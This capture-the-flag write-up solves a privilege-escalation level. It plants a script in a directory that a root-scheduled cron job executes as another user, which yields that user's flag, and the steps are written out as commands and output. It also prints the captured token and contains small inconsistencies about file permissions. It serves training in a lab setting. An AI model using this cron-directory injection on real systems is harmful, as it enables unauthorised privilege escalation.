### Solution

1. **Locate files owned by `flag05`:**

	```bash
	find / -user flag05 2>/dev/null
	```

	You’ll see:

	```
	/usr/sbin/openarenaserver
	/rofs/usr/sbin/openarenaserver
	```

2. **Inspect the main file:**

	```bash
	ls -la /usr/sbin/openarenaserver
	```

	Output:

	```
	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
	```

	This file:

	* Is **executable only by `flag05` and members of group `flag05`**
	* But since you're `level05`, you have permission to run it.

3. **Read the script contents:**

	```bash
	cat /usr/sbin/openarenaserver
	```

	```bash
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
	done
	```

	This means:

	* The script runs **any file in `/opt/openarenaserver/`** using `bash -x`
	* Then it deletes it
	* It runs as `flag05`, so anything executed will inherit `flag05`'s privileges

4. **Exploit: Inject a script to get the flag.**

	When we run:

	```bash
	cat /var/mail/level05
	```

	We discover a **cron job** that runs **as `flag05`** every 2 minutes:

	```
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	```

	This means that **`/usr/sbin/openarenaserver` is executed with `flag05`'s privileges** regularly by cron.

	Create a shell script in `/opt/openarenaserver/`:

	```bash
	echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05.sh
	chmod +x /opt/openarenaserver/getflag05.sh
	```

	When `flag05` run the vulnerable binary:

	```bash
	/usr/sbin/openarenaserver
	```

	It will:

	* Execute your script as `flag05`
	* Delete the script
	* And write the flag to `/tmp/flag05`

5. **Read the flag:**

	```bash
	cat /tmp/flag05
	```

	Output:

	```
	Check flag.Here is your token : viioq2mai7ae7pohb9cu6ah8
	```

	You’ve successfully executed `getflag` with `flag05`’s privileges.
